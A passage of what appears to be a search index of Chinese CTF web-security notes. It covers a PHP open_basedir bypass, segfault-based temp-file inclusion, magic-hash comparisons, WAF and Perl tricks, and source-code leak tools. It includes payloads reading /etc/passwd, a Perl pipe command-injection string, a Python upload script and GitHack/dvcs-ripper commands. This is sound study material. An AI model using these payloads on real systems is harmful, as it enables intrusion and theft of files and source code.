\u4f1a\u53d1\u73b0\u4e00\u4e2a\u6709\u8da3\u7684\u7ed3\u679c<code>/ =&gt; \\000</code></p> <p></p> <p>\u770b\u4e0b\u6e90\u7801 \u8089\u773c\u8ddf\u4e00\u4e0b\u6765\u5230<code>expand_filepath_with_mode</code>\u5927\u81f4\u529f\u80fd\u5c31\u662f\u89c4\u8303\u5316\u8def\u5f84</p> <p></p> <p><code>relative_to</code>\u5fc5\u5b9a\u4e3aNULL \u6240\u4ee5\u5fc5\u5b9a\u8fdb\u5165esle\u903b\u8f91 \u800c<code>VCWD_GETCWD</code>\u8fd9\u4e2a\u5b8f\u6700\u7ec8\u662f\u901a\u8fc7<code>_getcwd()</code>\u5b9e\u73b0\u7684</p> <p>\u7ee7\u7eed\u8ddf \u6765\u5230216\u884c \u8fd8\u662f\u5148\u8bb0\u5f55\u4e00\u4e0b\u5173\u952e\u53d8\u91cf\u7684\u503c</p> <p>\u7ee7\u7eed\u6267\u884c\u5230<code>strncmp</code>\u518d\u770b\u4e00\u4e0b\u53d8\u91cf\u7684\u503c</p> <p></p> <p>\u770b\u4e86\u4e0b\u5c31<code>resolved_name_len</code>\u53d8\u5316\u4e86 \u56de\u53bb\u770b\u6e90\u4ee3\u7801</p> <pre><code>resolved_name_len = strlen(resolved_name);\n</code></pre> <p>\u56e0\u4e3ac\u4e2d\u5b57\u7b26\u4e32\u662f\u4ee5<code>\\0</code>\u4e3a\u7ed3\u5c3e \u6240\u4ee5\u957f\u5ea6\u4ece17\u53d8\u4e3a13 \u7ecf\u8fc7<code>strncmp</code>\u5224\u65ad \u524d13\u300114\u4f4d\u80af\u5b9a\u4e00\u6837 \u8fd4\u56de0 \u7136\u540e\u8fd9\u4e2acheck\u5c31\u8fc7\u4e86</p> <p>\u5230\u8fd9\u91cc\u4e3a\u6b62\u597d\u50cf\u8fd8\u6ca1\u4ec0\u4e48\u95ee\u9898 \u90a3\u4e48\u56de\u5230\u521a\u521a</p>"},{"location":"web_bak/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/open_basedir%E7%BB%95%E8%BF%87/#_3","title":"\u95ee\u9898\u6240\u5728","text":"<p>\u521a\u624d\u662f\u4ece\u7b2c\u4e00\u4e2a<code>chdir('..')</code>\u5f00\u59cb\u8c03\u8bd5\u7684 \u91cd\u65b0\u68b3\u7406\u4e00\u4e0b</p> <p>\u9996\u5148\u4f20\u5165\u7684\u4e24\u4e2a\u53c2\u6570\u7684\u503c\u90fd\u662f\u90fd\u662f<code>..</code>\u8fd9\u4e2a\u5e94\u8be5\u6ca1\u4ec0\u4e48\u95ee\u9898</p> <p></p> <p>\u6765\u5230151\u884c \u5c31\u662f\u4e00\u4e2a\u590d\u5236\u611f\u89c9\u4e5f\u6ca1\u95ee\u9898</p> <pre><code>strlcpy(local_open_basedir, basedir, sizeof(local_open_basedir));\n</code></pre> <p>\u770b\u4e00\u4e0b\u503c</p> <p></p> <p>\u95ee\u9898\u6765\u4e86<code>local_open_basedir</code>\u4f1a\u5728\u4e4b\u540e\u7684\u903b\u8f91\u4e2d\u53c2\u4e0e<code>resolved_basedir</code>\u7684\u89c4\u8303\u5316</p> <p>\u4f46\u662f\u7531\u4e8e\u5f00\u5934\u7684<code>..\\0</code>\u4f1a\u4f7f\u5f97<code>resolved_basedir</code>\u7684\u89c4\u8303\u5316\u6d41\u7a0b\u548c<code>resolved_name</code>\u4e00\u6837 \u90fd\u662f\u4ee5\u5f53\u524d\u5de5\u4f5c\u76ee\u5f55\u4e3a\u57fa\u7840\u8fdb\u884c\u5904\u7406</p> <p></p> <p><code>..\\0</code>\u5bfc\u81f4if\u5fc5\u7136\u662f\u5047 \u4ece\u800c\u8fdb\u5165else\u903b\u8f91 \u90a3\u5c31\u4e00\u5b9a\u4f1a\u5230<code>VCWD_GETCWD</code>\u8fd9\u4e2a\u5b8f \u6700\u540e\u4f1a\u4f7f<code>resolved_basedir</code>\u548c<code>resolved_name</code>\u7684\u503c\u51e0\u4e4e\u4e00\u6837</p> <p>\u8fd9\u6837\u5c31\u5bfc\u81f4\u4e86<code>php_check_specific_open_basedir</code>\u4e00\u76f4\u8fd4\u56de0 \u4ece\u800c\u63a7\u5236\u5f53\u524d\u5de5\u4f5c\u76ee\u5f55\u4e00\u76f4\u5411\u4e0a\u7a7f\u8d8a \u5bfc\u81f4open_basedir\u88ab\u7ed5\u8fc7</p> <p>\u8fd9\u91cc\u7684\u5173\u952e\u5c31\u662f\u5982\u4f55\u5c06open_basedir\u8bbe\u7f6e\u4e3a<code>..</code>\u5728payload\u4e2d\u5148<code>chdir</code>\u5230\u4e86img \u518d\u5229\u7528open_basedir\u53ef\u4ee5\u8bbe\u7f6e\u4e3a\u76f8\u5bf9\u76ee\u5f55\u7684\u7279\u70b9\u8fdb\u884cbypass</p>"},{"location":"web_bak/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/php7_segment_fault%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/","title":"php7 segment fault\u4e34\u65f6\u6587\u4ef6\u5305\u542b","text":"<p>\u5411PHP\u53d1\u9001\u542b\u6709\u6587\u4ef6\u533a\u5757\u7684\u6570\u636e\u5305\u65f6\uff0c\u8ba9PHP\u5f02\u5e38\u5d29\u6e83\u9000\u51fa\uff0cPOST\u7684\u4e34\u65f6\u6587\u4ef6\u5c31\u4f1a\u88ab\u4fdd\u7559</p> <p>1.\u5229\u7528\u80fd\u8bbf\u95ee\u7684phpinfo\u9875\u9762\uff0c\u5bf9\u5176\u4e00\u6b21\u53d1\u9001\u5927\u91cf\u6570\u636e\u9020\u6210\u4e34\u65f6\u6587\u4ef6\u6ca1\u6709\u53ca\u65f6\u88ab\u5220\u9664</p> <p>2.PHP\u7248\u672c&lt;7.2\uff0c\u5229\u7528php\u5d29\u6e83\u7559\u4e0b\u4e34\u65f6\u6587\u4ef6</p> <p>php &lt; 7.2php://filter/string.strip_tags/resource=/etc/passwd</p> <ul> <li> <p>php7 \u8001\u7248\u672c\u901a\u6740php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA</p> </li> <li> <pre><code>import requestsfrom io import BytesIOurl=\"http://f0af8aa4-9e9c-40a8-9003-175dbc6f69f8.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd\"payload=\"&lt;?php phpinfo();?&gt;\"files={    \"file\":BytesIO(payload.encode())}r=requests.post(url=url,files=files,allow_redirects=False)\nprint(r.text)\nPython\n</code></pre> </li> </ul> <p>\u539f\u9898\uff1a[NPUCTF2020]ezinclude</p>"},{"location":"web_bak/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/%E4%BC%A0%E5%8F%82%E6%A0%BC%E5%BC%8F/","title":"\u4f20\u53c2\u683c\u5f0f","text":"<p>\u4e4b\u524d\u5728\u505a\u9898\u4e5f\u78b0\u4e0a\u8fd9\u6837\u7684\u4f20\u53c2\u65b9\u5f0f\uff0c\uff08\u5927\u6982\u7387\u662f\u56e0\u4e3a\u4e4b\u524d\u5b66\u7684\u65f6\u5019\u6bd4\u8f83\u4e0d\u4ed4\u7ec6\uff09</p> <p>this-&gt;code =@this-&gt;x()['Ginkgo'];</p> <p>\u8fd9\u91cc\u76f8\u5f53\u4e8e\u53ef\u4ee5\u7528get\u65b9\u5f0f\u8fdb\u884c\u53c2\u6570\u4f20\u9012\u3002</p>"},{"location":"web_bak/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83/","title":"\u5f31\u7c7b\u578b\u6bd4\u8f83","text":"<p>\u867d\u7136\u7b80\u5355\u800c\u4e14\u53ef\u80fd\u662f\u89c1\u8fc7\u5f88\u591a\u6b21\uff0c\u4f46\u662f\u554a\u8fd8\u662f\u653e\u4e00\u4e0b</p> <p>\"admin\"==0\u6bd4\u8f83\u7684\u65f6\u5019\uff0c\u4f1a\u5c06admin\u8f6c\u5316\u6210\u6570\u503c\uff0c\u5f3a\u5236\u8f6c\u5316,\u7531\u4e8eadmin\u662f\u5b57\u7b26\u4e32\uff0c\u8f6c\u5316\u7684\u7ed3\u679c\u662f0\u81ea\u7136\u548c0\u76f8\u7b49</p> <p>\"1admin\"==1\u6bd4\u8f83\u7684\u65f6\u5019\u4f1a\u5c061admin\u8f6c\u5316\u6210\u6570\u503c,\u7ed3\u679c\u4e3a1\uff0c\u800c\u201cadmin1\u201c==1 \u5374\u7b49\u4e8e\u9519\u8bef\uff0c\u4e5f\u5c31\u662f\"admin1\"\u88ab\u8f6c\u5316\u6210\u4e860</p> <p>\"0e123456\"==\"0e456789\"\u76f8\u4e92\u6bd4\u8f83\u7684\u65f6\u5019\uff0c\u4f1a\u5c060e\u8fd9\u7c7b\u5b57\u7b26\u4e32\u8bc6\u522b\u4e3a\u79d1\u5b66\u6280\u672f\u6cd5\u7684\u6570\u5b57\uff0c0\u7684\u65e0\u8bba\u591a\u5c11\u6b21\u65b9\u90fd\u662f\u96f6\uff0c\u6240\u4ee5\u76f8\u7b49\u3002</p> <p>0e\u5728\u6bd4\u8f83\u7684\u65f6\u5019\u4f1a\u5c06\u5176\u89c6\u4f5c\u4e3a\u79d1\u5b66\u8ba1\u6570\u6cd5\uff0c\u6240\u4ee5\u65e0\u8bba0e\u540e\u9762\u662f\u4ec0\u4e48\uff0c0\u7684\u591a\u5c11\u6b21\u65b9\u8fd8\u662f0\u3002md5('240610708')== md5('QNKCDZO')\u6210\u529f\u7ed5\u8fc7!</p> <pre><code>QNKCDZO\n\n0e830400451993494058024219903391\n\ns878926199a\n\n0e545993274517709034328855841020\n\ns155964671a\n\n0e342768416822451524974117254469\n\ns214587387a\n\n0e848240448830537924465865611904\n\ns214587387a\n\n0e848240448830537924465865611904\n\ns878926199a\n\n0e545993274517709034328855841020\n\ns1091221200a\n\n0e940624217856561557816327384675\n\ns1885207154a\n\n0e509367213418206700842008763514\n</code></pre>"},{"location":"web_bak/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/%E7%A9%BA%E6%A0%BC%E4%B8%8EWAF/","title":"\u7a7a\u683c\u4e0eWAF","text":""},{"location":"web_bak/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/%E7%A9%BA%E6%A0%BC%E4%B8%8EWAF/#wafnum","title":"\u5047\u5982waf\u4e0d\u5141\u8bb8num\u53d8\u91cf\u4f20\u9012\u5b57\u6bcd\uff1a","text":"<p>http://www.xxx.com/index.php?num=aaaa   //\u663e\u793a\u975e\u6cd5\u8f93\u5165\u7684\u8bdd</p> <p>\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5728num\u524d\u52a0\u4e2a\u7a7a\u683c\uff1a</p> <p>http://www.xxx.com/index.php?num= aaaa</p> <p>\u8fd9\u6837waf\u5c31\u627e\u4e0d\u5230num\u8fd9\u4e2a\u53d8\u91cf\u4e86\uff0c\u56e0\u4e3a\u73b0\u5728\u7684\u53d8\u91cf\u53eb\u201c num\u201d\uff0c\u800c\u4e0d\u662f\u201cnum\u201d\u3002\u4f46php\u5728\u89e3\u6790\u7684\u65f6\u5019\uff0c\u4f1a\u5148\u628a\u7a7a\u683c\u7ed9\u53bb\u6389\uff0c\u8fd9\u6837\u6211\u4eec\u7684\u4ee3\u7801\u8fd8\u80fd\u6b63\u5e38\u8fd0\u884c\uff0c\u8fd8\u4e0a\u4f20\u4e86\u975e\u6cd5\u5b57\u7b26\u3002</p>"},{"location":"web_bak/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/Perl/PARAM/","title":"PARAM","text":""},{"location":"web_bak/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/Perl/PARAM/#csaw-ctf-2016-quals-i-got-id-200","title":"csaw-ctf-2016-quals i-got-id-200","text":"<p>my file_name =param(field_name);</p> <p>\u83b7\u53d6\u4e0a\u4f20\u7684\u6587\u4ef6\u540d \u540e\u8005post\u6216\u8005get\u7684\u6570\u636e.</p> <p>param()\u51fd\u6570\u4f1a\u8fd4\u56de\u4e00\u4e2a\u5217\u8868\u7684\u6587\u4ef6\u4f46\u662f\u53ea\u6709\u7b2c\u4e00\u4e2a\u6587\u4ef6\u4f1a\u88ab\u653e\u5165\u5230\u4e0b\u9762\u7684\u63a5\u6536\u53d8\u91cf\u4e2d\u3002\u5982\u679c\u6211\u4eec\u4f20\u5165\u4e00\u4e2aARGV\u7684\u6587\u4ef6\uff0c\u90a3\u4e48Perl\u4f1a\u5c06\u4f20\u5165\u7684\u53c2\u6570\u4f5c\u4e3a\u6587\u4ef6\u540d\u8bfb\u51fa\u6765\u3002\u5bf9\u6b63\u5e38\u7684\u4e0a\u4f20\u6587\u4ef6\u8fdb\u884c\u4fee\u6539,\u53ef\u4ee5\u8fbe\u5230\u8bfb\u53d6\u4efb\u610f\u6587\u4ef6\u7684\u76ee\u7684</p> <p>ARGV(\u76f8\u5f53\u4e8e\u672c\u9898\u76ee\u7684\u63a5\u53d7\u53d8\u91cf\u7684\u6570\u7ec4\uff0c\u8fd9\u4e2a\u6570\u7ec4\u91cc\u9762\u7684\u5185\u5bb9\u4f5c\u4e3a\u547d\u4ee4\u884c\u53ef\u4ee5\u6267\u884c\uff0c\u76f8\u5f53\u4e8e\u662fparam()\u63a5\u53d7get\u5230\u7684\u53c2\u6570\u5e76\u4e14\u653e\u5728ARGV\u4e2d\uff0c\u7136\u540eARFV\u4e2d\u9ed8\u8ba4\u5c31\u9ed8\u8ba4\u8c03\u7528\u6267\u884c)</p> <p>perl\u5c06perl\u547d\u4ee4\u884c\u7684\u53c2\u6570\u5217\u8868\u653e\u8fdb\u6570\u7ec4ARGV(@ARGV)\u4e2d\u3002\u65e2\u7136\u662f\u6570\u7ec4\uff0c\u5c31\u53ef\u4ee5\u8bbf\u95ee($ARGV[n])\u3001\u904d\u5386\uff0c\u751a\u81f3\u4fee\u6539\u6570\u7ec4\u5143\u7d20</p>"},{"location":"web_bak/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/Perl/%E7%AE%A1%E9%81%93%E7%AC%A6/","title":"\u7ba1\u9053\u7b26","text":""},{"location":"web_bak/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/Perl/%E7%AE%A1%E9%81%93%E7%AC%A6/#bmzctf-hitcon_2017_ssrfme","title":"BMZCTF hitcon_2017_ssrfme","text":"<p>perl\u51fd\u6570\u770b\u5230\u8981\u6253\u5f00\u7684\u6587\u4ef6\u540d\u4e2d\u5982\u679c\u4ee5\u7ba1\u9053\u7b26\uff08\u952e\u76d8\u4e0a\u90a3\u4e2a\u7ad6\u6760\uff09\u7ed3\u5c3e\uff0c\u5c31\u4f1a\u4e2d\u65ad\u539f\u6709\u6253\u5f00\u6587\u4ef6\u64cd\u4f5c\uff0c\u5e76\u4e14\u628a\u8fd9\u4e2a\u6587\u4ef6\u540d\u5f53\u4f5c\u4e00\u4e2a\u547d\u4ee4\u6765\u6267\u884c\uff0c\u5e76\u4e14\u5c06\u547d\u4ee4\u7684\u6267\u884c\u7ed3\u679c\u4f5c\u4e3a\u8fd9\u4e2a\u6587\u4ef6\u7684\u5185\u5bb9\u5199\u5165\u3002\u8fd9\u4e2a\u547d\u4ee4\u7684\u6267\u884c\u6743\u9650\u662f\u5f53\u524d\u7684\u767b\u5f55\u8005\u3002\u5982\u679c\u4f60\u6267\u884c\u8fd9\u4e2a\u547d\u4ee4\uff0c\u4f60\u4f1a\u770b\u5230perl\u7a0b\u5e8f\u8fd0\u884c\u7684\u7ed3\u679c\u3002</p> <p>url=file:cat/flag|&amp;filename=/123.txt</p>"},{"location":"web_bak/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/CTF%E6%AF%94%E8%B5%9B%E4%B8%AD%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E7%9A%84%E4%B8%80%E4%BA%9Btrick/","title":"CTF\u6bd4\u8d5b\u4e2d\u4fe1\u606f\u641c\u96c6\u7684\u4e00\u4e9btrick","text":"<p>1.hint\u6216\u6e90\u7801\u85cf\u5728html\u6e90\u7801\u4e2d</p> <p>\u591a\u51c6\u5907\u51e0\u79cd\u65b9\u6cd5\u4ee5\u514d\u67d0\u4e9b\u65b9\u6cd5\u5931\u6548</p> <p>1\uff09\u6309F12\u67e5\u770b\u6e90\u7801</p> <p>2\uff09\u5728\u7f51\u5740\u6dfb\u52a0view-source:</p> <p>3\uff09\u76f4\u63a5\u4fdd\u5b58html\u6e90\u7801\u5230\u672c\u5730\uff0cFirefox\u4e0b\u76f4\u63a5\u6309Ctril+s\uff0c\u518d\u67e5\u770b\u6e90\u7801</p> <p>2.hint\u6216\u6e90\u7801\u85cf\u5728http\u4fe1\u606f\u91cc</p> <p>burpsuite\u6293\u5305\u68c0\u67e5</p> <p>3.\u85cf\u5728robots.txt\u91cc</p> <p>\u6ce8\u610f\u522b\u62fc\u9519</p> <ol> <li>www.zip\u7b49\u7c7b\u578b\u6cc4\u9732</li> </ol> <p>\u53ef\u4ee5\u76f4\u63a5\u626b\u51fa\u6765</p> <ol> <li>gitsvn\u7b49\u6cc4\u9732</li> </ol> <p>/.git/.svn</p> <p>\u4e5f\u662f\u4e0a\u5de5\u5177\u626b\u63cf</p> <p>6.vim\u4fee\u6539\u6587\u4ef6\u4f1a\u4ea7\u751f\u4e00\u4e2a\u4e34\u65f6\u4fdd\u5b58\u6587\u4ef6\uff0c\u8bbf\u95eeindex.php.swp</p> <p>7.\u85cf\u5728cookie\u91cc</p> <p>\u540cburp\u6293\u5305\u68c0\u67e5</p> <p>8.\u85cf\u5728DNS\u68c0\u67e5\u4fe1\u606f\u91cc</p> <p>\u5982\u56fe</p> <p></p> <p>\u963f\u91cc\u4e91\u8fd0\u7ef4\u68c0\u6d4b\u5e73\u53f0</p> <p>https://zijian.aliyun.com/</p> <p>9.\u67e5\u770bJS\u6e90\u7801</p> <p>10.\u5229\u7528\u7279\u5b9a\u7684\u6570\u636e\u5e93\u7684\u9ed8\u8ba4\u6587\u4ef6\u4f4d\u7f6e</p> <p>11./editor \u6216\u8005 /admin\u7b49\u7b49</p> <p>12.PING\u4e00\u4e0b\u770b\u770b</p> <p>ping\u68c0\u6d4b\u7ad9\u957f\u5de5\u5177</p> <p>http://ping.chinaz.com/</p> <p>13.PHP\u63a2\u9488\u5229\u7528</p> <p>\u6b22\u8fce\u8865\u5145</p>"},{"location":"web_bak/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/%E5%8D%81%E5%A4%A7%E5%B8%B8%E8%A7%81%E7%9A%84Web%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/","title":"\u5341\u5927\u5e38\u89c1\u7684Web\u6e90\u7801\u6cc4\u6f0f\u6f0f\u6d1e\u53ca\u5176\u5229\u7528","text":"<p>Web\u6e90\u7801\u6cc4\u9732\u7684\u6f0f\u6d1e\uff1a</p> <ul> <li>git\u6e90\u7801\u6cc4\u9732</li> <li>svn\u6e90\u7801\u6cc4\u9732</li> <li>hg\u6e90\u7801\u6cc4\u6f0f</li> <li>CVS\u6cc4\u9732</li> <li>Bazaar/bzr\u6cc4\u9732</li> <li>\u7f51\u7ad9\u5907\u4efd\u538b\u7f29\u6587\u4ef6</li> <li><code>WEB-INF/web.xml</code>\u6cc4\u9732</li> <li>DS_Store \u6587\u4ef6\u6cc4\u9732</li> <li>SWP \u6587\u4ef6\u6cc4\u9732</li> <li>GitHub\u6e90\u7801\u6cc4\u6f0f</li> </ul>"},{"location":"web_bak/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/%E5%8D%81%E5%A4%A7%E5%B8%B8%E8%A7%81%E7%9A%84Web%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/#1git","title":"1\u3001git \u6e90\u7801\u6cc4\u9732","text":"<p>Git\u662f\u4e00\u4e2a\u5f00\u6e90\u7684\u5206\u5e03\u5f0f\u7248\u672c\u63a7\u5236\u7cfb\u7edf\uff0c\u5728\u6267\u884c<code>git init</code>\u521d\u59cb\u5316\u76ee\u5f55\u7684\u65f6\u5019\uff0c\u4f1a\u5728\u5f53\u524d\u76ee\u5f55\u4e0b\u81ea\u52a8\u521b\u5efa\u4e00\u4e2a<code>.git</code>\u76ee\u5f55\uff0c\u7528\u6765\u8bb0\u5f55\u4ee3\u7801\u7684\u53d8\u66f4\u8bb0\u5f55\u7b49\u3002\u53d1\u5e03\u4ee3\u7801\u7684\u65f6\u5019\uff0c\u5982\u679c\u6ca1\u6709\u628a<code>.git</code>\u8fd9\u4e2a\u76ee\u5f55\u5220\u9664\uff0c\u5c31\u76f4\u63a5\u53d1\u5e03\u5230\u4e86\u670d\u52a1\u5668\u4e0a\uff0c\u653b\u51fb\u8005\u5c31\u53ef\u4ee5\u901a\u8fc7\u5b83\u6765\u6062\u590d\u6e90\u4ee3\u7801\u3002</p> <p>\u6f0f\u6d1e\u5229\u7528\u5de5\u5177\uff1aGitHack</p> <p>github\u9879\u76ee\u5730\u5740\uff1ahttps://github.com/lijiejie/GitHack</p> <p>\u7528\u6cd5\u793a\u4f8b\uff1a</p> <p><pre><code>GitHack.py http://www.openssl.org/.git/\n</code></pre> \u4fee\u590d\u5efa\u8bae\uff1a\u5220\u9664.git\u76ee\u5f55\u6216\u8005\u4fee\u6539\u4e2d\u95f4\u4ef6\u914d\u7f6e\u8fdb\u884c\u5bf9.git\u9690\u85cf\u6587\u4ef6\u5939\u7684\u8bbf\u95ee\u3002</p>"},{"location":"web_bak/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/%E5%8D%81%E5%A4%A7%E5%B8%B8%E8%A7%81%E7%9A%84Web%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/#2svn","title":"2\u3001SVN \u6e90\u7801\u6cc4\u9732","text":"<p>SVN\u662f\u4e00\u4e2a\u5f00\u653e\u6e90\u4ee3\u7801\u7684\u7248\u672c\u63a7\u5236\u7cfb\u7edf\u3002\u5728\u4f7f\u7528SVN\u7ba1\u7406\u672c\u5730\u4ee3\u7801\u8fc7\u7a0b\u4e2d\uff0c\u4f1a\u81ea\u52a8\u751f\u6210\u4e00\u4e2a\u540d\u4e3a.svn\u7684\u9690\u85cf\u6587\u4ef6\u5939\uff0c\u5176\u4e2d\u5305\u542b\u91cd\u8981\u7684\u6e90\u4ee3\u7801\u4fe1\u606f\u3002\u7f51\u7ad9\u7ba1\u7406\u5458\u5728\u53d1\u5e03\u4ee3\u7801\u65f6\uff0c\u6ca1\u6709\u4f7f\u7528\u2018\u5bfc\u51fa\u2019\u529f\u80fd\uff0c\u800c\u662f\u76f4\u63a5\u590d\u5236\u4ee3\u7801\u6587\u4ef6\u5939\u5230WEB\u670d\u52a1\u5668\u4e0a\uff0c\u8fd9\u5c31\u4f7f.svn\u9690\u85cf\u6587\u4ef6\u5939\u88ab\u66b4\u9732\u4e8e\u5916\u7f51\u73af\u5883\uff0c\u53ef\u4ee5\u5229\u7528.svn/entries\u6587\u4ef6\uff0c\u83b7\u53d6\u5230\u670d\u52a1\u5668\u6e90\u7801\u3002</p> <p>\u6f0f\u6d1e\u5229\u7528\u5de5\u5177\uff1aSeay SVN\u6f0f\u6d1e\u5229\u7528\u5de5\u5177</p> <p>\u4fee\u590d\u5efa\u8bae\uff1a\u5220\u9664web\u76ee\u5f55\u4e2d\u6240\u6709.svn\u9690\u85cf\u6587\u4ef6\u5939\uff0c\u5f00\u53d1\u4eba\u5458\u5728\u4f7f\u7528SVN\u65f6\uff0c\u4e25\u683c\u4f7f\u7528\u5bfc\u51fa\u529f\u80fd\uff0c\u7981\u6b62\u76f4\u63a5\u590d\u5236\u4ee3\u7801\u3002</p>"},{"location":"web_bak/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/%E5%8D%81%E5%A4%A7%E5%B8%B8%E8%A7%81%E7%9A%84Web%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/#3hg","title":"3\u3001hg\u6e90\u7801\u6cc4\u6f0f","text":"<p>Mercurial \u662f\u4e00\u79cd\u8f7b\u91cf\u7ea7\u5206\u5e03\u5f0f\u7248\u672c\u63a7\u5236\u7cfb\u7edf\uff0c\u4f7f\u7528<code>hg init</code>\u7684\u65f6\u5019\u4f1a\u751f\u6210.hg\u3002</p> <p>\u6f0f\u6d1e\u5229\u7528\u5de5\u5177\uff1a dvcs-ripper</p> <p>github\u9879\u76ee\u5730\u5740\uff1ahttps://github.com/kost/dvcs-ripper</p> <p>\u7528\u6cd5\u793a\u4f8b\uff1a</p> <pre><code>rip-hg.pl -v -u http://www.example.com/.hg/\n</code></pre>"},{"location":"web_bak/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/%E5%8D%81%E5%A4%A7%E5%B8%B8%E8%A7%81%E7%9A%84Web%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/#4cvs","title":"4\u3001CVS\u6cc4\u9732","text":"<p>CVS\u662f\u4e00\u4e2aC/S\u7cfb\u7edf\uff0c\u591a\u4e2a\u5f00\u53d1\u4eba\u5458\u901a\u8fc7\u4e00\u4e2a\u4e2d\u5fc3\u7248\u672c\u63a7\u5236\u7cfb\u7edf\u6765\u8bb0\u5f55\u6587\u4ef6\u7248\u672c\uff0c\u4ece\u800c\u8fbe\u5230\u4fdd\u8bc1\u6587\u4ef6\u540c\u6b65\u7684\u76ee\u7684\u3002\u4e3b\u8981\u662f\u9488\u5bf9 CVS/Root\u4ee5\u53caCVS/Entries\u76ee\u5f55\uff0c\u76f4\u63a5\u5c31\u53ef\u4ee5\u770b\u5230\u6cc4\u9732\u7684\u4fe1\u606f\u3002</p> <p><pre><code>http://url/CVS/Root \u8fd4\u56de\u6839\u4fe1\u606f\nhttp://url/CVS/Entries \u8fd4\u56de\u6240\u6709\u6587\u4ef6\u7684\u7ed3\u6784\n</code></pre> \u6f0f\u6d1e\u5229\u7528\u5de5\u5177\uff1advcs-ripper github\u9879\u76ee\u5730\u5740\uff1ahttps://github.com/kost/dvcs-ripper.git</p> <p>\u8fd0\u884c\u793a\u4f8b:</p> <pre><code>rip-cvs.pl -v -u http://www.example.com/CVS/\n</code></pre>"},{"location":"web_bak/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/%E5%8D%81%E5%A4%A7%E5%B8%B8%E8%A7%81%E7%9A%84Web%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/#5bazaarbzr","title":"5\u3001Bazaar/bzr\u6cc4\u9732","text":"<p>bzr\u4e5f\u662f\u4e2a\u7248\u672c\u63a7\u5236\u5de5\u5177, \u867d\u7136\u4e0d\u662f\u5f88\u70ed\u95e8, \u4f46\u5b83\u4e5f\u662f\u591a\u5e73\u53f0\u652f\u6301, \u5e76\u4e14\u6709\u4e0d\u9519\u7684\u56fe\u5f62\u754c\u9762\u3002</p> <p>\u8fd0\u884c\u793a\u4f8b\uff1a</p> <pre><code>rip-bzr.pl -v -u http://www.example.com/.bzr/\n</code></pre>"},{"location":"web_bak/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/%E5%8D%81%E5%A4%A7%E5%B8%B8%E8%A7%81%E7%9A%84Web%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/#6","title":"6\u3001\u7f51\u7ad9\u5907\u4efd\u538b\u7f29\u6587\u4ef6","text":"<p>\u7ba1\u7406\u5458\u5c06\u7f51\u7ad9\u6e90\u4ee3\u7801\u5907\u4efd\u5728Web\u76ee\u5f55\u4e0b\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u731c\u89e3\u6587\u4ef6\u8def\u5f84\uff0c\u4e0b\u8f7d\u5907\u4efd\u6587\u4ef6\uff0c\u5bfc\u81f4\u6e90\u4ee3\u7801\u6cc4\u9732\u3002</p> <p>\u5e38\u89c1\u7684\u5907\u4efd\u6587\u4ef6\u540e\u7f00\uff1a</p> <ul> <li>.rar</li> <li>.zip</li> <li>.7z</li> <li>.tar.gz</li> <li>.bak</li> <li>.txt</li> <li>.old</li> <li>.temp</li> </ul> 